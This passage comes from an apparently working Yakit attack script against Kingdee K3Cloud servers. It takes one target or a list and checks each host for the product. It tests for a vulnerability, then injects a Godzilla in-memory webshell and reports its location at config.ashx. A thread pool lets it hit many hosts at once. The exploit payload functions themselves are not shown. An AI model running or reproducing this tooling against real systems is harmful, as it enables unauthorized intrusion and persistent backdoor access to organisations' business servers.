        //yakit.Info(f`Injectmemshell`)
        //memshellList = append(memshellList, url)
        return true
    } else{
        //yakit.Info(f`Not vulnerable:${url}, response: ${rspIns.StatusCode}, ${rspIns.Body}`)
        return false
    }
}
runUrl = func(addr){
    isTls = false
        if str.StartsWith(addr, "https"){
            isTls = true
        }
        if !(str.StartsWith(addr, "http")){
            addr = "http://"+ addr
        }
        l = str.ParseStringToHosts(addr)
        if len(l) <= 0{
            yakit.Error(f"Error parse host: ${addr}")
            return
        }
        host,port = nil,nil
        try{
            host, port = str.ParseStringToHostPort(addr)~
        }catch err{
            host = l[0]
            if isTls{
                port = 443
            } else{
                port = 80
            }
        }
        proxy = ""
        url = buildUrl(host, port, K3Path, isTls)
        f = checkExists(host, port , K3Path, isTls, proxy)
        if !f{
            yakit.Error(`No k3cloud here, exit.`)
            return
        }
        yakit.Info(f`K3Cloud Exists: ${url}`)
        f = checkVul(host, port, isTls, proxy)
        if !f{
            yakit.Error(f`Not vulnerable: ${url}`)
            return
        }
        yakit.Info(f`Vulnerable: ${url}`)
        f = injectMemshell(host, port, isTls, proxy)
        if !f{
            yakit.Error(`Inject memshell failed`)
            return
        }
        u = buildUrl(host, port, "/k3Cloud/uploadfiles/config.ashx", isTls)
        yakit.Info(f`Inject godzilla memshell at ${u}`)
        return
}
handleUrl = func(swg, addr){
    swg.Add()
    go func{
        defer swg.Done()
        defer func{
            recover()
        }
        runUrl(addr)
    }
}

start = func(){
    addr = cli.String("target")
    addrs = cli.String("targets")
    cli.check()
    if addr != ""{
        yakit.Info(f`Target: ${addr}`)
        runUrl(addr)
    } else {
        addrList = str.Split(addrs, "\n")
        if len(addrList) <=0{
            yakit.Error("No target")
            return
        }
        targetList = []
        for i in addrList{
            ii = str.Trim(i, " ")
            if len(ii) > 0{
                targetList = append(targetList, ii)
            }
        }
        yakit.Info(f"Targets Number: ${len(targetList)}")
        swg = sync.NewSizedWaitGroup(10)
        for i in targetList{
            handleUrl(swg, i)
        }
        swg.Wait()

    }

    //swg = sync.NewSizedWaitGroup(10)
